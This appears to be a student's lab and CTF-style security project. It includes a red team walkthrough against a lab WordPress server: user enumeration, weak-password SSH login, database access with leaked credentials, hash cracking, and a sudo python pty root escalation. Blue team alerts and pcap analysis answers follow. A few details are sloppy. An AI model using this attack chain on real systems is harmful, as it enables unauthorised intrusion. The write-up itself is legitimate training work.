# Final-Project
Offensive/Defensive/Network Analysis

Red Team: Summary of Operations

Exposed Services
Critical Vulnerabilities
Exploitation


Exposed Services
Nmap scan results for each machine reveal the below services and OS details:
$ nmap -sV -A 192.168.1.110
 
_C:\GITHUB\Final-Project\Screenshots\nmap scan


This scan identifies the services below as potential points of entry:

**Target 1**

Port 22/tcp open ssh
Port 80/tcp open http
Port 110/tcp rcpbind
Port 139/tcp open netbios-ssn
Port 445/tcp open netbios-ssn
Target 1

**Weak user passwords**
User password hashes not salted – WordPress dbase
User enumeration – WordPress
Misconfiguration of User Privileges/privilege escalation

Using the command wpscan --url http://192.168.1.110/wordpress eu.  This is known as user enumeration -used by attackers to get usernames of WordPress-sites. 
Users found were Michael and Steven

 
**Exploitation**
With Michael as the user name and simple guess of common password was made (user: Michael,  password: Michael).  This guess was successful using ssh:

ssh michael@192.168.1.110

This implies that the password was very weak and possibly, there was no strong password policy put in place.

Access to var directory and subdirectories was made : cd /var/www/ html
Using the command nano  service.html, flag1 hash value was revealed.

Flag1 :  b9bbcb33ellb80be759c4e844862482d

**COMMAND**:
ssh Michael @192.168.1.110
psword: Michael
cd /         to get to root directory
cd /var/www/html
ls -ltr
nano service.html 

OR   Alternatively cat service.html | grep flag* still had the flag1 retrieved 

Logged in as Michael, flag2.txt was retrieved using directory traversal as in flag1 above 

**COMMAND:**
ssh Michael @192.168.1.110
password: Michael
cd /      
cd /var/www/
ls -ltr
cat flag2.txt

Capturing Flag 3: Accessing MySQL database.
With credentials found on wordpress.config, access to mysql database was successful
 
Username: root
Password: R@v3nSecurity
Commands:
Mysql -u root -p
Password: R@v3nSecurity
Show databases;
Use wordpress;
Show tables;
Select * from wp_posts;
Fag3 hash value: afc01ab56b50591e7dccf93122770cd2   and Flag4 hash value: 715dea6c055b9fe3337544932f2941ce   were all revealed

FURTHER EXPLOIT FOR FLAG4
Inside MYSQL database the content of a table (wp_users) was displayed to get the password for the users particularly steven. 
Commands:
Mysql -u root -p
Password: R@v3nSecurity
Show databases;
Use wordpress;
Show tables;
Select * from wp_users

The password hashes for Michael and steven were copied to a text file and brute forced using john the ripper.
COMMAN:
John steven.txt             ………..where john is the command and steven.txt the file

Password revealed as:  pink84
With this password, access to the target with steven as the user was successful

ssh steven @192.168.1.110
password: pink84
checked for privilege escalation

sudo -l  
   
used python script to escalate to the root 
sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
cd /root
ls
 

FLAG4 revealed

Blue Team: Summary of Operations
Table of Contents
Network Topology
Description of Targets
Monitoring the Targets
Patterns of Traffic & Behavior
Suggestions for Going Further
Network Topology.
 
Diagram above as used in our group presentation

The following machines were identified on the network:
 Capstone
Operating System:  Ubuntu 18.04
Purpose: This is a vulnerable web server
IP Address: 192.168.1.105

ELK 
Operating System:  Ubuntu 18.04
Purpose: The ELK Stack holds the Kibana and Elasticsearch.  It is where all the logging are stored
IP Address: 192.168.1.100

KALI
Operating System:  Kali Linux (Debian kali 5.0)
Purpose: It is the attacking machine where all the penetration testing occurred.
IP Address: 192.168.1.90

TARGET 1
Operating System:  Debian GNU /Linux 8
Purpose: This is the vulnerable machine that was attacked and compromised
IP Address: 192.168.1.110

TARGET 2
Operating System:  Debian GNU /Linux 8
Purpose: Another vulnerable machine in the network
IP Address: 192.168.1.115

Description of Targets
There are two vulnerable vms in this network namely Target 1 and Target 2
The target of this attack was: Target 1 (192.168.1.110).
Target 1 is an Apache web server and has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers. As such, the following alerts have been implemented:

**Monitoring the Targets**
Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below:
ALERTS:
1. Excessive HTTP Errors
This is implemented as follows:
WHEN count() GROUPED OVER top 5 ‘http.response.status_code IS ABOVE 400 FOR THE LAST 5 minutes
Metric: WHEN count() GROUPED OVER top 5 ‘http.response.status_code
Threshold: IS ABOVE 400
Vulnerability Mitigated: Brute Force /Enumeration
Reliability: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.
This is highly reliable alert. Error codes above greater or equal to 400 points to the server side and will definitely reflect when it occurs
 
2. HTTP Request Size Monitor
Implemented as follows:
WHEN sum() of http.request.bytes OVER all documents IS ABOVE 3500 FOR THE LAST 1 minute
Metric: WHEN sum() of http.request.bytes OVER all documents
Threshold: IS ABOVE 3500
Vulnerability Mitigated: SQL code injection, Distributed Denial Of Service, and Cross-site scripting attacks
Reliability: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.
It is possible to have false positives because there could be authentic or legitimate http requests that could be above the size of the threshold but this should not be at high sides.  I would say medium rate of reliability.
 
3. CPU Request Size Monitor
Implemented as follows:
WHEN max() OF system.process.cpu.total.pct OVER all documents IS ABOVE 0.5 FOR THE LAST 5 minutes
Metric: WHEN max() OF system.process.cpu.total.pct OVER all documents
Threshold: IS ABOVE 0.5
Vulnerability Mitigated: viruses, malwares and any program that’s runs and takes up more CPU resources
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.
 
Each alert above pertains to a specific vulnerability/exploit. Recall that alerts only detect malicious behavior, but do not stop it. For each vulnerability/exploit identified by the alerts above, suggest a patch. E.g., implementing a blocklist is an effective tactic against brute-force attacks. It is not necessary to explain how to implement each patch.
The logs and alerts generated during the assessment suggest that this network is susceptible to several active threats, identified by the alerts above. In addition to watching for occurrences of such threats, the network should be hardened against them. The Blue Team suggests that IT implement the fixes below to protect the network:

Vulnerability 1 : HTTP  ERRORS
**Patch:**  
 Hardening WordPress
 Regular updates should be made with apt-get
 Security plugins like wordfence could be installed
Unused features should be disabled to minimize open doors for attack
 Wordpress admin logins should be removed from public access

**Why It Works**: 
 Regular updates will patch some of the exploits/vulnerabilities
 Security plugs can scan for malicious codes.
 It can also provide firewall for tto block harmful traffic
 Removal of admin logins from public access reduces attack surface
 Disabling unused features reduces attack surface.

Vulnerability 2:   REQUEST SIZE MONITOR  
Patch: 
 Distributed denial of service (DDOS), code injection and cross site scripting should all be hardened
HTTP request limit on the web server should be set with regards to the length of querying string, and request size.
Input validated should be implemented.

Why It Works:
When the limit set is reached, errors will occur thereby creating rejection of the request
Input validation prevents malicious attacks from non-human agents.
 
Vulnerability 3:  CPU USAGE MONITOR 
Patch:  Malware /virus hardening
Strong antivirus programs should be installed and updated 
Host based Intrusion Detection System (HIDS) can be installed

Why It Works: 
Strong antiviruses scan and remove all malicious codes that are usurping the system resources
HIDS monitors and alerts of any malicious traffic into the system 
Network Analysis  
Time Thieves
(USED PCAP FILE FROM  http://tinyurl.com/yaajh8o8)

At least two users on the network have been wasting time on YouTube. Usually, IT wouldn't pay much mind to this behavior, but it seems these people have created their own web server on the corporate network. So far, Security knows the following about these time thieves:
They have set up an Active Directory network.
They are constantly watching videos on YouTube.
Their IP addresses are somewhere in the range 10.6.12.0/24.
You must inspect your traffic capture to answer the following questions:
What is the domain name of the users' custom site?
Filter:  ip.addr==10.6.12.0/24
FRANK-N-TED.COM
 

2.	What is the IP address of the Domain Controller (DC) of the AD network?
Filter:   ip.addr==10.6.12.0/24
10.6.12.12  ……………Frank-n-Ted.com

3.	What is the name of the malware downloaded to the 10.6.12.203 machine? Once you have found the file, export it to your Kali machine's desktop.
Filter :  ip.addr==10.6.12.203 and http.request.method==GET 
Export File > Export Object >HTTP
 

Upload the file to VirusTotal.com. What kind of malware is this classified as?
The malware is classified as TROJAN

Vulnerable Windows Machines
The Security team received reports of an infected Windows host on the network. They know the following:
Machines in the network live in the range 172.16.4.0/24.
The domain mind-hammer.net is associated with the infected computer.
The DC for this network lives at 172.16.4.4 and is named Mind-Hammer-DC.
The network has standard gateway and broadcast addresses.
Inspect your traffic to answer the following questions:
Find the following information about the infected Windows machine:
Host name: ROTTERDAM-PC
IP address: 172.16.4.205
MAC address:00:59:07:b0:63:a4
 

2.	What is the username of the Windows user whose computer is infected? matthijs.devries
 
3.	What are the IP addresses used in the actual infection traffic?
166.62.111.64
185.243.115.84
172.16.4.205
 

4.	As a bonus, retrieve the desktop background of the Windows host
On the packet I followed the steps FILE -> EXPORT OBJECTS -> HTTP -> SEARCH FOR IMG (IMAGE FILES
Found the image below with recycle icon on desktop and the taskbar with date and time
 
ILLEGAL DOWNLOADS 
IT was informed that some users are torrenting on the network. The Security team does not forbid the use of torrents for legitimate purposes, such as downloading operating systems. However, they have a strict policy against copyright infringement.
IT shared the following about the torrent activity:
The machines using torrents live in the range 10.0.0.0/24 and are clients of an AD domain.
The DC of this domain lives at 10.0.0.2 and is named DogOfTheYear-DC.
The DC is associated with the domain dogoftheyear.net.
Your task is to isolate torrent traffic and answer the following questions:

Find the following information about the machine with IP address 10.0.0.201:
MAC address: 00:16:17:66:c8
Windows username: elmer.blanco 
OS version: windows 10 64bit
 
Used filter:  http.request and !(ssdp) 
 

2.	Which torrent file did the user download? 
[Full request URI: http://www.publicdomaintorrents.com/bt/btdownload.php?type=torrent&file=Betty_Boop_Rhythm_on_the_Reservation.avi.torrent]
Filter:  ip.addr==10.0.0.201 and (http.request.full_uri contains ".torrent")
 

